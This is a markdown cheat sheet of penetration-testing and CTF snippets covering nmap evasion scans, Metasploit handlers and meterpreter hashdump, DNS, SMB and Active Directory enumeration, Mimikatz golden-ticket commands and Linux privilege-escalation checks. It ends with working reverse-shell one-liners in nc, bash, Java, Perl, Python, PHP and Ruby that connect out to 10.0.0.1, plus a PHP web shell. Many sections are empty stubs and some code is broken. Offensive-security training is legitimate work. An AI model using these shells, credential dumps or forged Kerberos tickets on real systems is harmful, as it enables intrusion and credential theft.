# Snippet Toolbox
Sometimes we just forget how to use a tool. Here is a list of useful snippets for penetration testing and CTFs.

* General
	* nc/ncat
	* nmap
	* metasploit
	* scapy
* [ARP](#arp)
	* netdiscover
* [DNS](#dns)
	* whois
	* nslookup
	* host
	* dig
	* fierce
	* DNSenum
	* DNSrecon
	* Sublist3r
* [Active Directory](#ad)
	* Basics
	* Enumeration
	* Lateral Movement
	* Domain Privesc
	* Persistence
	* Trust Privesc
* [E-mail](#email)
	* The Harvester
* [SNMP](#snmp)
	* onesixtyone
	* SNMPwalk
* [SMB](#smb)
	* [rpcclient](#rpc)
	* smbclient
	* smbmap
	* enum4linux
* [Web](#web)
	* dirb/dirbuster
	* nikto
	* wpscan
	* sqlmap
* [Windows](#windows)
	* cmd
	* Powershell
	* WMIC
	* [winpeas](#winpeas) [link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
	* [Empire](#)
* [NIX](#nix)
	* bash
	* [grep](#grep)
	* [GTFObins](#gtfo) [link](https://gtfobins.github.io/)
	* [tcpdump[(#tcpdump)]
* [abd](#abd)

<h2 id="general">General</h2>	

	du -hs directory/

<h3 id="ncat">ncat</h3>	

	rlwrap nc -nvvv 127.0.0.1 4444
	rlwrap nc -nlvp 4444

<b>Upgrade to Meterpreter shell</b>

	#Setup Listener
	msfconsole
	use exploit/multi/handler
	set lhost 10.10.10.10.
	set lport 4444
	set payload linux/x86/shell_reverse_tcp
	run

	#Method 1
	CTRL+Z
	sessions -u [session id]
	sessions -u 1
	sessions
	sessions -i [new session id

	#Method 2
	use post/multi/manage/shell_to_meterpreter
	set session 1
	run
	sessions
	sessions -i  2

<h3 id="nmap">nmap</h3>
	
	nmap -sn 10.10.10.0/24 #ping scan
	nmap -sT 10.10.10.10 #connect scan
	nmap -sS 10.10.10.10 #SYN scan
	nmap -sU 10.10.10.10 #UDP scan
	nmap -sV 10.10.10.10 #Version fingerprinting
	nmap -O 10.10.10.10 #Detect OS
	nmap -A 10.10.10.10 #Agressive
	nmap -p- 10.10.10.10
	nmap -6 [:] #ipv6

<b>Advanced</b>
	
	nmap -f 10.10.10.10 #fragments
	nmap -mtu 8 10.10.10.10 #transmission in bytes
	nmap -D RND:10 10.10.10.10 #10 decoy address
	nmap -sI 10.2.2.2 10.10.10.10 #10.2.2.2 as zombie idle machine
	nmap --source-port 54 10.10.10.10 #Force using port 54
	nmap --data-length 25 10.10.10.10 #Add random data to probe packets
	nmap 10.10.0.0/11 -sT -sV -Pn -n -vvv --min-rate=5000 --min-hostgroup=256 --min-parallelism=256
	nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 10.10.10.10 #map firewall rules

<b>nmap scripts</b>

	ls -l /usr/share/nmap/scripts/http*
	nmap --script-help ftp-anon
	nmap --script=http-robots.txt 10.10.10.10

<b>tnmap</b>

<h3 id="masscan">masscan</h3>

	masscan -p1-65535,U:1-65535 10.10.10.0/24 --rate=1000 =e tun0

	search mongo
	search cve:2019 type:exploit
	search cve:2018 platform:windows
	back
	exit

	info
	help show

	show payloads
	save

	show advanced
	
	set displayablepayloadhandler true
	show encoders
	show nops
	show evasion


<h3 id="meterpreter">Meterpreter</h3>	


<b>hashdump</b>

	sessions -i 7
	sysinfo
	ps
	getpid
	hashdump
	getprivs
	getsystem
	migrate 170

<b>kaodic</b>
	
<h2 id="arp">ARP</h2>	

<h3 id="netdiscover">netdiscover</h3>

	netdiscover -r 10.10.10.0/24	

<h3 id="ettercap">Ettercap</h3>
	
	ettercap -G

<h3 id="bettercap">Bettercap</h3>


<h2 id="dns">DNS</h2>	

<h3 id="dig">dig</h3>

	dig -t mx umich.com
	dig -t any umich.com
	dig AXFR yourdomain.coom @xfrout1.dynect.net

<h3 id="fierce">fierce</h3>

	fierce -dns umich.edu
	fierce -dns umich.edu --wordlist /usr/share/wordlist

<h3 id="whois">whois</h3>	

	whois umich.edu

<h3 id="nslookup">nslookup</h3>	
<h3 id="host">host</h3>	
<h3 id="dig">fierce</h3>	

<h3 id="dnsenum">DNSenum</h3>	

	dnsenum umich.edu

<h3 id="dnsrecon">DNSrecon</h3>	

	dnsrecon -d umich.edu

<h3 id="sublister">sublist3r</h3>	

	sublist3r -d google

<h2 id="snmp">SNMP</h2>	

<h3 id="one">onesixtyone</h3>

	onesixtyone 10.10.10.10

<h3 id="snmpwalk">SNMPwalk</h3>

	snmpwalk -v 1 -c public 10.10.10.10
	snmapwalk -v2c -c public 10.10.10.19 1.3.6.1.2.1.4.34.1.3 #Full scan

<h3 id="enyx">Enyx</h3>

	enyx 1 public 10.10.10.10

<h2 id="smb">SMB</h2>

<h3 id="rpc">rpclient</h3>	

	rpcclient -U "" 127.0.0.1
	querydominfo
	enumdomusers

<h3 id="smbclient">smbclient</h3>	

	smbclient -L //127.0.0.1 #List shares
	mount -t cifs //127.0.0.1/Backups /mnt/smb #Mount share

	smbclient //10.10.10.10/share -I -N #Interactive + No-pass
<h3 id="smbmap">smbmap</h3>	

	smbmap -H 127.0.0.1
	smbmap -u DoesNotExit -H 127.0.0.1
	
<h3 id="enum4linux">enum4linux</h3>	

	enum4linux 127.0.0.1

<h2 id="web">Web</h2>

<a href="./web">Web Exploitation</a>

<b>Exploit script template</b>

	import requests
	from colorama import Fore, Back, Style

	requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

	proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

	def format_text(title, item):
		cr = '\r\n'
		section_break = cr + "*" * 20 + cr
		item = str(item)
		text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
		return text

	r = requests.get('https://umich.com', verify=False, proxies=proxies)
	print format_text('r.status_code is: ', r.status_code)
	print format_text('r.headers is: ', r.headers)
	print format_text('r.cookies is: ', r.cookies)
	print format_text('r.text: ', r.text)

<h3 id="dirb">Dirb</h3>
	
	dirb http://10.10.10.10 /usr/share/dirb/wordlists

<h3 id="nikto">Nikto</h3>
	
	nikto -h http://10.10.10.10

<h3 id="burp">Burpsuite</h3>

<h2 id="ad">Active Directory</h2>

<h3>Powershell basics</h3>


<h3>Domain Enumeration</h3>

<b>PowerView</b>

	Get-NetDomain
	Get-NetDomain -Domain powershell.local
	Get-DomainSID
	Get-ADDDomain
	Get-AddDomain -Identity powershell.local
	(Get-ADDomain).DomainSID.Value

	Get-NetDomainController
	Get-NetDomainController -Domain powershell.local
	Get-ADDomainController
	Get-ADDomainController -Discover -DomainName powershell.local

	Get-NetUser
	Get-NetUser -Domain powershell.local
	Get-NEtUser -UserName labuser
	Get-ADUser -Filter * -Properties *
	Get-ADUser -Server ps-dc.pwershell.local
	Get-ADUser -Identity labuser
	

<h3>Lateral Movement</h3>
<b>MimiKatz</b>

<h3>Domain Privelege Escalation</h3>

<h3>Persistence</h3>

<b>Golden Ticket</b>
<b>Silver Ticket</b>

<h3>Across Trusts</h3>

<b>Trust Tickets</b>
<b>krbtgt hash<b/>
Child to Forest Root 

	Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
	Invoke-Mimikatz -Command '"kerberos::gold /user:Administrator /domain:offensiveps.powershell.local /sid:S-1-5- /krbtgt:a9d1 /sids:s-1-5 /ticket:krb_tkt.kirbi"'

<h3>Defenses</h3>

<h2 id="windows">Windows</h2>


<h3 id="winprivesc">Windows Privilege Escalation</h3>

<b>Checklist</b>

* Misconfigured services
* Replaceable services
* Configuration files and data containing passwords
* Registry settings
* Information stored in registry


<h2 id="nix">NIX</h2>

<h3 id="nixprivesc">Linux Privilege Escalation</h3>

<b>Checklist</b>
	
* Config files
* SUID binaries
* Scheduled jobs
* Running application/Services
* Distribution
* Kernel version

<b>Config files</b>
	
	ls -ls /etc/ | grep .conf
	ls -ls /var/www/html
	

<b>SUID binaries</b>
	
	find /* -user root -perm -4000 -print 2>/dev/null

<b>Crontab</b>
	
	pspy64 -pf -i 1000 #print commands/file system events and scan procfs every second

<h3 id="revshell">Reverse shells</h3>

<b>nc/ncat</b>

	nc -nlvp 4444
	nc -nvvv 10.10.10.10 4444 -e /bin/sh
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

<b>bash</b>

<b>Java</b>

	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()

<b>Perl</b>

	perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

<b>Python</b>
	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

<b>PHP</b>
	
	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
	<?php system($_GET['aloha']); ?>

<b>Ruby</b>
	
	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

<b>xterm</b>

	xterm -display 10.0.0.0:1
	xhost +targetip
	Xnest :1  #Listener

<h3 id="listeners">Listeners</h3>

<b>stty</b>

	nc -nlvp 4444
	python -c 'import pty;pty.spawn("/bin/bash")'
	Ctrl+Z
	stty raw -echo
	fg
	
	export SHELL=bash
	export TERM=xterm-256color

<b>rlwrap</b>
	
	rlwrap nc -nlvp 4444

<h3 id="ipcalc">ipcalc</h3>

	ipcalc 122.64.0.0 - 122.95.255.255
	ipcalc 122.64.0.0/11

<h3 id="find">find</h3>
	
	find / -name foo.txt -type f -print #print not necessary
	find /opt /usr /var -name config -type f
	find . -iname config #search case insensitive

<h3 id="grep">grep</h3>

	grep 'password' /etc/config #search for 'password' in config (quotes not necessary)
	grep 'password' * #search all files in current directory
	egrep 'password|secret' * #search multiple strings

	grep -l config *.php #search for filenames containing the string 'config'
	grep -il config *.php #same but case insensitive
	grep -rl 'password' . #same but recursive in current directory

	grep -ir 'username' /directory/*

<h3 id="tcpdump">tcpdump</h3>

<h3 id="john">john</h3>

	john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

<h2 id="python">Python</h2>

<b>Convert IPv6 to hex</b>

	s = ""
	s = s.split(".")
	ip = ""
	for i in is:
		ip += hex(int(i))[2:].rjust(2, '0')
	print ip

<b>Pwntools</b>


